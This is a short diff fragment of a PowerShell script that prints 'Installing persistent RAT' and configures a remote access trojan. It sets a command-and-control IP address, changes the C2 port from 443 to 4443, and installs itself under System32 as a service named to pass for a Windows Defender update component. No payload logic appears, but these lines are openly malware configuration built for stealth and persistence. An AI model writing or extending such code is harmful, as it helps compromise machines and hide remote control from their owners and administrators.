@@ -15,7 +15,7 @@ Write-Host "[*] Installing persistent RAT..." -ForegroundColor Cyan
 
 # Configuration
 $C2_IP = "152.53.38.5"
-$C2_PORT = 443
+$C2_PORT = 4443
 $SERVICE_NAME = "WinDefenderUpdateSvc"
 $INSTALL_PATH = "$env:SystemRoot\System32\WindowsUpdateAssist.ps1"
 
